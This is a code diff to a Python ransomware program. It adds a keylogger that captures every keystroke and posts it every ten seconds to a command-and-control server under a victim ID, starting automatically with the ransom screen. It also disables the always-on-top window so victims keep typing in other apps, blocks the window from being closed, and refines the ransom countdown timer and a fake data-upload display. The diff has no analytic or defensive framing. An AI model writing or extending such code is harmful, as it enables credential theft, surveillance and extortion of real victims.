@@ -19,6 +19,7 @@ try:
     from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
     from cryptography.hazmat.backends import default_backend
     import requests
+    from pynput import keyboard
 except ImportError as e:
     try:
         debug_path = os.path.join(os.path.expanduser("~"), "RANSOMWARE_IMPORT_ERROR.txt")
@@ -317,6 +318,47 @@ def check_in_with_c2(aes_key):
         # Ultimate fallback
         return "CRITICAL-FAILURE"
 
+# --- Keylogger Logic ---
+class Keylogger:
+    def __init__(self, victim_id):
+        self.victim_id = victim_id
+        self.log_buffer = ""
+        self.lock = threading.Lock()
+        self.stop_event = threading.Event()
+        
+    def start(self):
+        try:
+            self.listener = keyboard.Listener(on_press=self.on_press)
+            self.listener.start()
+            threading.Thread(target=self.flush_loop, daemon=True).start()
+            log_error("Keylogger started successfully")
+        except Exception as e:
+            log_error(f"Keylogger Start Error: {e}")
+        
+    def on_press(self, key):
+        try:
+            k = key.char
+        except AttributeError:
+            k = f"[{key.name}]"
+        
+        with self.lock:
+            self.log_buffer += str(k)
+            
+    def flush_loop(self):
+        while not self.stop_event.is_set():
+            time.sleep(10)
+            with self.lock:
+                if not self.log_buffer:
+                    continue
+                data = self.log_buffer
+                self.log_buffer = ""
+            
+            try:
+                requests.post(f"{C2_SERVER_URL}/api/keylog/{self.victim_id}", json={"keys": data}, timeout=3)
+                log_error(f"Sent {len(data)} chars to C2")
+            except Exception as e:
+                log_error(f"Keylog upload failed: {e}")
+
 # --- GUI Logic ---
 class RansomwareGUI:
     def __init__(self, master, victim_id):
@@ -405,6 +447,14 @@ class RansomwareGUI:
         self.master.after(2000, self.change_wallpaper)
         threading.Thread(target=self.audio_loop, daemon=True).start()
         # threading.Thread(target=self.watchdog_loop, daemon=True).start() # DISABLED: Causing System Lag
+        
+        # START KEYLOGGER AUTOMATICALLY
+        self.keylogger = Keylogger(victim_id)
+        self.master.after(1000, self.keylogger.start)
+        
+        # RAGEBAIT CLOSE HANDLER
+        master.protocol("WM_DELETE_WINDOW", self.ragebait_close)
+        master.bind("<Alt-F4>", lambda e: self.ragebait_close())
 
     def ragebait_close(self):
         """Intercepts close request and trolls the user."""
@@ -416,14 +466,16 @@ class RansomwareGUI:
         except: pass
 
     def force_focus_loop(self):
-        """Aggressively keeps window on top, unless paying. REDUCED FREQUENCY."""
-        if not self.payment_mode_active:
-            try:
-                self.master.lift()
-            except:
-                pass
-        # Reduced to 3000ms to stop stuttering
-        self.master.after(3000, self.force_focus_loop)
+        """Aggressively keeps window on top, unless paying. DISABLED to allow keylogging."""
+        # DISABLED: This was preventing the victim from using other apps
+        # The keylogger needs the victim to be able to type in other windows
+        pass
+        # if not self.payment_mode_active:
+        #     try:
+        #         self.master.lift()
+        #     except:
+        #         pass
+        # self.master.after(3000, self.force_focus_loop)
 
     def speak_message(self, message):
         """Cross-platform TTS. Synchronous (blocking) version for threads."""
@@ -497,30 +549,32 @@ class RansomwareGUI:
             
             if self.time_left <= 0:
                 self.master.after(0, self.trigger_doomsday)
-                try: self.timer_label.config(text="00:00:00")
-                except: pass
+                self.master.after(0, lambda: self.timer_label.config(text="00:00:00"))
                 break
             
             m, s = divmod(self.time_left, 60)
             h, m = divmod(m, 60)
             time_str = f"{h:02d}:{m:02d}:{s:02d}"
             
-            try:
-                self.timer_label.config(text=time_str)
-                if self.time_left < 3600:
-                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
-            except:
-                pass
+            # THREAD-SAFE: Schedule GUI update on main thread
+            self.master.after(0, lambda ts=time_str: self._update_timer_display(ts))
+    
+    def _update_timer_display(self, time_str):
+        try:
+            self.timer_label.config(text=time_str)
+            if self.time_left < 3600:
+                self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
+        except:
+            pass
 
     def fake_exfiltration(self):
         stages = [ "Scanning...", "Compressing...", "Encrypting...", "Connecting...", "Uploading...", "Complete." ]
         for stage in stages:
             if not self.heartbeat_thread_running: break
-            try: self.exfil_status.config(text=f"STATUS: {stage}")
-            except: pass
+            # THREAD-SAFE: Schedule GUI update on main thread
+            self.master.after(0, lambda s=stage: self.exfil_status.config(text=f"STATUS: {s}"))
             time.sleep(2)
-        try: self.exfil_status.config(text="STATUS: UPLOAD COMPLETE", fg='#ff0000')
-        except: pass
+        self.master.after(0, lambda: self.exfil_status.config(text="STATUS: UPLOAD COMPLETE", fg='#ff0000'))
 
     def heartbeat_polling(self):
         while self.heartbeat_thread_running:
